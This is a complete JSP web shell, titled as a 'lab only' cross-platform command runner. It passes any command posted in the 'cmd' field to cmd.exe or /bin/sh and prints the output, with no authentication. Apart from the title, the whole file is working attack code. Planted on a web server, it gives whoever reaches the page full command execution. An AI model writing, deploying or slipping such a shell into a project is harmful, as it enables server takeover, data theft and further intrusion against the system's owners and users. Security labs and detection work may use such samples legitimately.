<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.*" %>
<%!
    // HTML转义
    public String htmlEncode(String s) {
        if(s == null) return "";
        StringBuilder sb = new StringBuilder();
        for(char c : s.toCharArray()){
            switch(c){
                case '&': sb.append("&amp;"); break;
                case '<': sb.append("&lt;"); break;
                case '>': sb.append("&gt;"); break;
                case '"': sb.append("&quot;"); break;
                case '\'': sb.append("&#39;"); break;
                default: sb.append(c);
            }
        }
        return sb.toString();
    }
%>
<%
    String output = "";
    String osName = System.getProperty("os.name");
    boolean isWindows = osName.toLowerCase().contains("win");

    String cmdParam = request.getParameter("cmd");
    if("POST".equalsIgnoreCase(request.getMethod()) && cmdParam != null && !cmdParam.trim().isEmpty()){
        String cmd = cmdParam.trim();
        if(cmd.length() > 1024){
            output = "Command too long (max 1024)";
        }else{
            Process proc = null;
            try{
                String[] execCmd;
                if(isWindows){
                    execCmd = new String[]{"cmd.exe","/c",cmd};
                }else{
                    execCmd = new String[]{"/bin/sh","-c",cmd};
                }
                proc = Runtime.getRuntime().exec(execCmd);

                //读取标准输出
                BufferedReader brOut = new BufferedReader(new InputStreamReader(proc.getInputStream(),"UTF-8"));
                BufferedReader brErr = new BufferedReader(new InputStreamReader(proc.getErrorStream(),"UTF-8"));
                String line;
                StringBuilder sb = new StringBuilder();
                while((line = brOut.readLine()) != null){
                    sb.append(line).append("\n");
                }
                while((line = brErr.readLine()) != null){
                    sb.append(line).append("\n");
                }
                proc.waitFor();
                output = sb.toString();
                if(output.isEmpty()) output = "No output or command returned empty.";
            }catch(Exception e){
                output = "Execute Exception: " + e.getMessage();
            }finally{
                if(proc != null) proc.destroy();
            }
        }
    }
%>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Cross Platform Shell (JSP Lab Only)</title>
    <style>
        * {
            box-sizing: border-box;
        }
        body {
            font-family: sans-serif;
            color: rgba(0,0,0,.85);
            max-width:900px;
            margin:2rem auto;
            padding:0 15px;
        }
        pre, input, button {
            padding:10px;
            border-radius:6px;
        }
        label {
            display:block;
            margin-bottom:6px;
        }
        input {
            flex:1;
            background-color:#efefef;
            border:2px solid transparent;
            font-size:14px;
        }
        input:focus {
            outline:none;
            background:#fff;
            border:2px solid #99ccff;
        }
        button {
            border:none;
            cursor:pointer;
            margin-left:8px;
            background:#d8e8ff;
        }
        button:hover {
            background-color:#b8d4f8;
        }
        .form-group {
            display:flex;
            padding:10px 0 20px;
        }
        pre{
            background:#111;
            color:#0f0;
            white-space:pre-wrap;
            word-wrap:break-word;
            overflow-x:auto;
        }
        .info{
            background:#f0f8ff;
            padding:8px 12px;
            border-radius:5px;
            margin-bottom:15px;
        }
    </style>
</head>
<body>
    <h1>Cross Platform Command Exec (JSP Lab)</h1>
    <div class="info">
        OS Detected: <%= htmlEncode(isWindows ? "Windows" : "Linux") %><br/>
        OS Info: <%= htmlEncode(osName) %>
    </div>
    <h2>Execute Command</h2>
    <form method="post">
        <label for="cmd"><strong>Command</strong></label>
        <div class="form-group">
            <input type="text" name="cmd" id="cmd" value="<%= htmlEncode(cmdParam) %>"
                   onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus>
            <button type="submit">Run</button>
        </div>
    </form>
    <% if("POST".equalsIgnoreCase(request.getMethod())){ %>
        <h2>Output</h2>
        <pre><%= htmlEncode(output) %></pre>
    <% } %>
</body>
</html>
